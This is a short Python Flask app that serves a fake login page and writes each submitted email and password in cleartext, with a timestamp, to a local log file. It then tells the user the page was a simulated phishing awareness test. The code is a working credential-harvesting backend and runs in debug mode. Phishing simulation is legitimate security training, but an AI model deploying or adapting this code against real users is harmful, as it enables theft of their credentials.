from flask import Flask, request, render_template
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('fake_login.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['password']
    with open("user_logs.txt", "a") as f:
        f.write(f"{datetime.now()} - Email: {email}, Password: {password}\n")
    return "This was a simulated phishing login. Thank you for participating in this awareness test."

if __name__ == "__main__":
    app.run(debug=True)